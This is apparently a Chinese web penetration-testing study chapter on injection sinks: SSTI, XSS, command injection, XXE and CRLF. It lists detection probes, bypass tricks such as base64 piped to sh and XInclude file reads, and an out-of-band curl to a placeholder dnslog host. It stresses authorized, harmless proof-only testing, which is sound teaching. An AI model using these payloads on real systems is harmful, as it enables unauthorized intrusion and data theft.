# 06 · 模板与注入面：输入进了哪种解释器

> 数据流模型（02_心智模型/01）的「汇点」实操卷：模板引擎 / HTML与JS / 操作系统命令 / XML 解析器 / HTTP 头。
> 每个汇点一节，统一五段。判定探针全部单请求、无害。

---

## 一、SSTI（服务端模板注入）

### 【判定】分引擎探针序列（按序发，观察 49 / 报错 / 无变化）

```
第1发  {{7*7}} 与 ${7*7} 各一次（不同接口位置）
       → 49 出现 = 模板注入成立（哪套语法生效=哪个引擎族）
       → 报错含模板引擎名 = 直接认引擎（最快路径）
       → 原样回显 = 只是反射，转 XSS 判定（§二）
第2发  语法指纹细分：
       {{7*'7'}}  → '7777777'(Jinja2) vs 49(Twig) vs 报错(其他)
       #{7*7}     → 生效=Thymeleaf(Spring)/Ruby ERB 候选
       ${7*7}     → 生效=FreeMarker/Velocity/EL(Java系)
       <% 7*7 %>  → EJS/ERB 族
第3发  引擎内确认（无害）：
       Jinja2:  {{config}}（泄露配置对象=高危证据）/ {{self.__class__}}
       FreeMarker: ${.version}（直接给版本）
       Velocity:  $class.inspect("java.lang.System")
       Twig: {{app.request.server.all|join(',')}}
       Thymeleaf: 常发于 URL 路径（/__${expr}::x 或 ?page=__${...}）
```

| 引擎 | 生态 | 招牌探针 | 高危确认（无害级） |
|---|---|---|---|
| Jinja2 | Flask/Django | `{{config}}` | config 对象含 SECRET_KEY → 会话伪造链（05 篇） |
| FreeMarker | Java（**JimuReport 系就在用**） | `${.version}` | `<#assign ex="freemarker.template.utility.Execute"?new()>` 存在性判定（**只判定 API 可用，不执行命令**） |
| Velocity | Java 老系统 | `$class` 工具对象存在性 | 同上原则 |
| Thymeleaf | Spring | 路径/参数里 `__${7*7}__` 预处理 | 3.x 历史 CVE 面（表达式预处理） |
| Twig | PHP | `{{app}}` | `_self.env` 存在性 |
| Pug/EJS | Node | `#{7*7}` / `<%= %>` | options 注入（原型污染链，04 篇 §三） |
| Smarty | PHP | `{php}` 标签被禁情况 | 版本差异大，按版本查 |

### 【测试红线】证明到「模板求值成立 + 引擎与版本确认」即高危成立（`${.version}` 回显就是完整证据）。**不执行系统命令**——执行那一刻从「验证」变「入侵」。报告写「可求值任意表达式，配合引擎内置 Execute 类 API 可达成 RCE（未在授权测试中执行）」。

### 【绕过】`{{` 被过滤时：语法等价（`${}`/`#{}`/`<% %>` 换族试）；关键字黑名单（`class`/`config`）→ 属性链等价写法（`__class__`→`|attr("__class__")` Jinja 过滤器语法）；沙箱（SandboxedEnvironment）→ 沙箱逃逸是版本相关的深水区，**判定到「有沙箱」就停**，报告里注明。

### 【学习】PortSwigger SSTI 全 lab（分引擎，最好的教材）；本地：Flask+Jinja2 十行 demo 自造靶；智库 `SSTI`（16 篇，薄——外部 lab 为主力）；**用你的 JimuReport 战例反向学习**：当年那个 FreeMarker 面就是 SSTI，把当时的完整链路用本篇语言重写一遍进案例库（消化型转换）。

## 二、XSS：上下文判定决定一切

### 【判定】反射位置的五种上下文（同一 payload 换上下文即失效——**先定位上下文再谈 payload**）

| 上下文 | 识别特征 | 判定探针（无害字符集） | 逃逸所需 |
|---|---|---|---|
| HTML body | 输入出现在标签之间 | `<>"'` 哪些被转义 | `<script>` 或事件属性 |
| HTML 属性值 | 出现在 `value="..."` | `"` 是否转义；无引号属性时**空格**是否可用 | `"><svg onload=...>` / 空格+事件 |
| JS 字符串 | 出现在 `var x="..."` | `\` `"` `'` `</script>` 处理 | 闭合引号+语句（PortSwigger lab 经典面） |
| JS 模板/逻辑 | 出现在 `${}` 或直接拼进表达式 | `}` `` ` `` `{` | 模板逃逸 |
| URL/href | 出现在 `<a href="...">` | `javascript:` 是否被过滤 | 协议绕过（大小写/编码/`java%0ascript:`历史变体） |
| SVG/CSS/Markdown | 富文本渲染后 | 各引擎 sanitize 白名单 | 引擎特定标签（svg/onload 系） |

**标准探针**：一次性送 `x"'<>{}` 类无害特征串（canary 法，02_心智模型/01），看每个字符在反射点的处理（转义/删除/原样）——**处理表就是该点的过滤规则**，逃逸方案由表直接推出。

### 【测试】证明标准：`alert(document.domain)` 级弹窗或 `console.log` 执行即成立（**用自己的小号页面证明**；存储型双账号互证，07_SRC/04 §6）。不构造打真实用户的蠕虫/钓鱼页（红线+伦理）。

### 【绕过】机制归类（实例查 PATT 189 篇 XSS）：转义不完整（只转 `"` 没转 `'`）→ 换引号；标签黑名单 → 冷门标签（svg/math/details/iframe srcdoc）；事件黑名单 → 冷门事件（ontoggle/onfocus/onauxclick）；`javascript:` 过滤 → 数据协议/相对协议历史变体；**CSP 存在时**：读 CSP 策略找白名单域上的 JSONP 端点/CDN 上的可利用脚本（dangling markup 概念）——这是「防御文档反读法」的又一实例（dojo 02_心智模型/06 §四）。

### 【学习】PortSwigger XSS 全 lab；智库 `XSS`（189 篇）+ `XSS cheat sheet`；验收：给你一段反射点 HTML 源码，10 秒说出上下文类型和第一个探针。

## 三、命令注入

### 【判定】
```
无回显是常态，判定靠三神谕：
① 时间：参数尾加 ;sleep 5（Linux）/ |ping -n 6 127.0.0.1（Win）→ 时延 5s = 成立
② 带外：$(curl http://你的dnslog) / `nslookup x.你的dnslog` → 回连 = 成立+出网
③ 布尔：;true vs ;false / &&1 vs &&0 的响应差
注入点高发参数：filename/path/ip/domain/interface/cmd/ping/dns查询类功能、
              「导出/转换/压缩」类功能（后端调 shell 工具：ffmpeg/imagemagick/pandoc/wkhtmltopdf）
分隔符全表：; | && || & \n %0a ` $() ${} （sh 系）· | & ^ （cmd 系）
```

### 【测试红线】**时间/带外证明即停**。「能执行 id 并回显」不需要——「sleep 生效」已经等价证明了任意命令执行。不执行任何写/删/出网取数动作（dnslog 回连本身是无害证明物）。

### 【绕过】机制四类：空白替代（`${IFS}`/`$IFS$9`/制表符）；关键字切割（`ca\tt`、变量拼接 `a=ca;b=t;$a$b`）；编码（hex/base64+`echo|base64 -d|sh`——**这属于执行准备，判定阶段用等价无害命令**）；引号规避（`w'h'o'am'i`）。防御方是 `escapeshellarg`（参数级，难绕）还是黑名单（字符级，好绕）——先判定防御级别再投入（dojo 02_心智模型/06 §三 L1-L4 阶梯同样适用）。

### 【学习】本地：Flask `os.popen(request.args['cmd'])` 十行靶；vulhub 命令注入系；智库 `command injection`（1339 篇命令/代码执行的主力区）；**盲注三神谕与 SQL 盲注完全同构**——对照 01 篇 §1.2 学，一份努力两份收获。

## 四、XXE（XML 外部实体）

### 【判定】
```
前提：存在 XML 解析入口——Content-Type: application/xml / text/xml 的接口、
     SOAP 服务（.asmx/WSDL）、SVG 上传、docx/xlsx 上传（本质是 zip 内 XML！）、SAML 断言（05 篇 §六）
探针1（内部实体回显）：<!DOCTYPE r [<!ENTITY x "xxe_test">]><r>&x;</r> → 回显 xxe_test = XML 被解析且实体展开
探针2（外部实体+带外）：<!ENTITY % d SYSTEM "http://你的dnslog/x"><%d;> → 回连 = 出网型 XXE 成立
探针3（报错型）：<!ENTITY d SYSTEM "file:///nonexist"> → 报错含文件不存在细节 = 文件读取面
docx/svg 通道：改包内 xml 塞实体后上传（zip 结构，工具化程度高）
```

### 【测试红线】文件读取证明用 `/etc/hostname` 或 Windows `win.ini` 首行（无害标志文件）——**不读 shadow/配置/业务数据**。带外通道用自有 dnslog。

### 【绕过】`file://` 被禁 → `http://`/`ftp://`/`php://`（按语言）；实体被禁（`disallow-doctype-decl`）→ XXE 关闭，转 XInclude（无 DOCTYPE 也能注入：`<foo xmlns:xi=...><xi:include parse="text" href="/etc/hostname"/>`）；无回显 → 带外 DTD（外部 dtd 文件里定义参数实体链——经典 blind XXE，模板查 PATT）；WAF 拦 DOCTYPE → 编码变体（UTF-16 XML 合法且过滤器常漏）。

### 【学习】PortSwigger XXE 全 lab；本地起一个解析 XML 的接口自造靶；智库 `XXE`（21 篇）+ `XInclude`；验收：能说出「为什么上传 docx 也可能是 XXE」和 blind XXE 的参数实体链条。

## 五、CRLF / HTTP 头注入 / 响应拆分

### 【判定】
```
注入点：任何「用户输入进响应头」的位置——重定向的 Location、Set-Cookie 值、
       Content-Disposition 文件名、CORS 的 ACAO（05 篇）、自定义头回显
探针：参数送 %0d%0aX-Injected:%20true → 响应出现新头 X-Injected = 成立
升级面：注入 Set-Cookie（会话固定）/ 注入响应体（<script>，即响应拆分 XSS）/
       与缓存交互（投毒面，概念级：注入的头被缓存层存下服务给其他用户——判定到「有缓存+可注入」即报告）
```

### 【测试红线】只注入自定义无害头（X-Injected）证明可拆分；**不注入 Set-Cookie 到他人会话、不做真实缓存投毒验证**（影响其他用户=破坏业务边界；报告用「可升级为缓存投毒」的推论表述+证据链）。

### 【绕过】裸 `\r\n` 被滤 → 编码变体（%0d%0a / %u000d 历史 / 双编码）；部分框架只滤 `\n` 不滤 `\r`（老 Tomcat/PHP 差异）；HTTP/2 下头注入语义不同（二进制分帧，走私面见 08 篇）。

### 【学习】PortSwigger CRLF/请求走私入门 lab；智库 `CRLF`（5 篇，薄——用 PATT 在线版补）；这节内容小而频（重定向功能是国产系统标配），值得做成条件反射：**见 Location 头含用户输入就发一次 %0d%0a 探针**。

## 【本篇学习建议】

1. 五个汇点的判定探针**合并成一套「解释器探测组合拳」**（8 个请求内完成）：`{{7*7}}` / `${7*7}` / `;sleep 3` / 特征串 canary（XSS 上下文判定）/ XML 实体 / `%0d%0a` / JSON 类型混淆（02 篇）/ 单引号（01 篇）——每个新接口例行一遍，这就是「假设驱动」的标准化弹药。
2. 学习顺序按你的生态频率：**FreeMarker SSTI（JimuReport 家族直接相关）→ XSS 上下文 → 命令注入 → XXE（docx 通道）→ CRLF**。
3. 所有「执行级」动作（RCE/文件写/缓存投毒实操）只发生在本地靶场；真实目标一律停在「求值成立/时延成立/回连成立/可拆分成立」——**证明与执行的分界线就是你的职业生命线**，本篇每节的红线段背下来。
